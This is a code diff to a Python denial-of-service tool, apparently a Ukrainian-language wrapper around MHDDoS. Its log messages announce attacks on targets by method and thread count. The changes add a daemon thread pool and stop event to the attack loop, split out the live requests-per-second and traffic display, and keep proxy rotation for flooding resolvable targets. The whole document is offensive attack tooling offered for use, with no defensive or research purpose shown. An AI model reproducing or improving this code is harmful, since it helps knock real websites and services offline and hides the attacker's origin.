@@ -1,13 +1,14 @@
 import argparse
 import logging
 import os
+import queue
 import random
 from collections import namedtuple
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from functools import lru_cache
 from multiprocessing import cpu_count
 from pathlib import Path
-from threading import Thread, Lock
+from threading import Thread, Lock, Event
 from time import sleep, time
 
 import dns.resolver
@@ -183,7 +184,7 @@ def update_proxies(period, targets, threads, proxy_timeout):
             wr.write(str(proxy) + '\n')
 
 
-def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table):
+def run_ddos(thread_pool, targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table):
     threads_per_target = total_threads // len(targets)
     params_list = []
     for target in targets:
@@ -205,6 +206,8 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_
 
     logger.info(f'{cl.OKGREEN}Запускаємо атаку...{cl.RESET}')
     statistics = {}
+    event = Event()
+    event.set()
     for params in params_list:
         thread_statistics = {'requests': AtomicCounter(), 'bytes': AtomicCounter()}
         statistics[params] = thread_statistics
@@ -212,11 +215,13 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_
             **params._asdict(),
             'proxy_fn': 'empty.txt' if vpn_mode else 'proxies.txt',
             'rpc': rpc,
-            'timer': period,
+            'sock_timeout': proxy_timeout,
+
+            'thread_pool': thread_pool,
+            'event': event,
             'statistics': thread_statistics,
-            'sock_timeout': proxy_timeout
         }
-        Thread(target=mhddos_main, kwargs=kwargs, daemon=True).start()
+        mhddos_main(**kwargs)
         if not table:
             logger.info(
                 f"{cl.WARNING}Атакуємо{cl.OKBLUE} %s{cl.WARNING} методом{cl.OKBLUE} %s{cl.WARNING}, потоків:{cl.OKBLUE} %d{cl.WARNING}!{cl.RESET}"
@@ -225,56 +230,60 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_
     if not (table or debug):
         logger.info(f'{cl.OKGREEN}Атака запущена, новий цикл через {period} секунд{cl.RESET}')
         sleep(period)
-        return
-
-    ts = time()
-    refresh_rate = 4 if table else 2
-    sleep(refresh_rate)
-    while True:
-        passed = time() - ts
-        if passed > period:
-            break
-
-        tabulate_text = []
-        total_pps = 0
-        total_bps = 0
-        for k in statistics:
-            counters = statistics[k]
-            pps = int(counters['requests'].reset() / refresh_rate)
-            total_pps += pps
-            bps = int(counters['bytes'].reset() / refresh_rate)
-            total_bps += bps
-            if table:
-                tabulate_text.append(
-                    (f'{cl.WARNING}%s' % k.url.host, k.url.port, k.method, k.threads, Tools.humanformat(pps), f'{Tools.humanbits(bps)}{cl.RESET}')
-                )
-            else:
-                logger.debug(
-                    f'{cl.WARNING}Ціль:{cl.OKBLUE} %s,{cl.WARNING} Порт:{cl.OKBLUE} %s,{cl.WARNING} Метод:{cl.OKBLUE} %s{cl.WARNING} Потоків:{cl.OKBLUE} %s{cl.WARNING} PPS:{cl.OKBLUE} %s,{cl.WARNING} BPS:{cl.OKBLUE} %s / %d%%{cl.RESET}' %
-                    (
-                        k.url.host,
-                        k.url.port,
-                        k.method,
-                        k.threads,
-                        Tools.humanformat(pps),
-                        Tools.humanbits(bps),
-                        round((time() - ts) / period * 100, 2),
-                    )
-                )
-
-        if table:
-            tabulate_text.append((f'{cl.OKGREEN}Усього', '', '', '', Tools.humanformat(total_pps), f'{Tools.humanbits(total_bps)}{cl.RESET}'))
-
-            cls()
-            print_banner(vpn_mode)
-            print(f'{cl.OKGREEN}Новий цикл через {round(period - passed)} секунд{cl.RESET}')
-            print(tabulate(
-                tabulate_text,
-                headers=[f'{cl.OKBLUE}Ціль', 'Порт', 'Метод', 'Потоки', 'Запити/c', f'Трафік/c{cl.RESET}'],
-                tablefmt='fancy_grid'
-            ))
-
+    else:
+        ts = time()
+        refresh_rate = 4 if table else 2
         sleep(refresh_rate)
+        while True:
+            passed = time() - ts
+            if passed > period:
+                break
+            _show_statistic(statistics, refresh_rate, table, vpn_mode, ts, period, passed)
+            sleep(refresh_rate)
+    event.clear()
+
+
+def _show_statistic(statistics, refresh_rate, table, vpn_mode, ts, period, passed):
+    tabulate_text = []
+    total_pps = 0
+    total_bps = 0
+    for k in statistics:
+        counters = statistics[k]
+        pps = int(counters['requests'].reset() / refresh_rate)
+        total_pps += pps
+        bps = int(8 * counters['bytes'].reset() / refresh_rate)
+        total_bps += bps
+        if table:
+            tabulate_text.append((
+                f'{cl.WARNING}%s' % k.url.host, k.url.port, k.method,
+                k.threads, Tools.humanformat(pps), f'{Tools.humanbits(bps)}{cl.RESET}'
+            ))
+        else:
+            logger.debug(
+                f'{cl.WARNING}Ціль:{cl.OKBLUE} %s,{cl.WARNING} Порт:{cl.OKBLUE} %s,{cl.WARNING} Метод:{cl.OKBLUE} %s{cl.WARNING} Потоків:{cl.OKBLUE} %s{cl.WARNING} PPS:{cl.OKBLUE} %s,{cl.WARNING} BPS:{cl.OKBLUE} %s / %d%%{cl.RESET}' %
+                (
+                    k.url.host,
+                    k.url.port,
+                    k.method,
+                    k.threads,
+                    Tools.humanformat(pps),
+                    Tools.humanbits(bps),
+                    round((time() - ts) / period * 100, 2),
+                )
+            )
+
+    if table:
+        tabulate_text.append((f'{cl.OKGREEN}Усього', '', '', '', Tools.humanformat(total_pps),
+                              f'{Tools.humanbits(total_bps)}{cl.RESET}'))
+
+        cls()
+        print_banner(vpn_mode)
+        print(f'{cl.OKGREEN}Новий цикл через {round(period - passed)} секунд{cl.RESET}')
+        print(tabulate(
+            tabulate_text,
+            headers=[f'{cl.OKBLUE}Ціль', 'Порт', 'Метод', 'Потоки', 'Запити/c', f'Трафік/c{cl.RESET}'],
+            tablefmt='fancy_grid'
+        ))
 
 
 def get_resolvable_targets(targets):
@@ -293,6 +302,27 @@ def get_resolvable_targets(targets):
                 logger.warning(f'{cl.FAIL}Ціль {target} не резолвиться і не буде атакована{cl.RESET}')
 
 
+class DaemonThreadPool:
+    def __init__(self, num_threads):
+        self._queue = queue.SimpleQueue()
+        for cnt in range(num_threads):
+            try:
+                Thread(target=self._worker, daemon=True).start()
+            except RuntimeError:
+                logger.warning(f'{cl.FAIL}Не вдалося запустити усі {num_threads} потоків - максимум {cnt - 100}{cl.RESET}')
+                exit()
+
+    def submit(self, fn):
+        self._queue.put(fn)
+
+    def _worker(self):
+        while True:
+            work_item = self._queue.get(block=True)
+            if work_item is not None:
+                work_item()
+                del work_item
+
+
 def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods, vpn_mode, debug, table):
     os.chdir('mhddos')
     if table:
@@ -304,6 +334,7 @@ def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods,
         if bypass in http_methods:
             logger.warning(f'{cl.FAIL}Робота методу {bypass} не гарантована - атака методами за замовчуванням може бути ефективніша{cl.RESET}')
 
+    thread_pool = DaemonThreadPool(total_threads)
     while True:
         targets = list(get_resolvable_targets(targets_iter))
         if not targets:
@@ -319,7 +350,7 @@ def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods,
         no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in targets)
         if not no_proxies:
             update_proxies(period, targets, max(total_threads, THREADS_PER_CORE), proxy_timeout)
-        run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table)
+        run_ddos(thread_pool, targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table)
 
 
 def init_argparse() -> argparse.ArgumentParser:
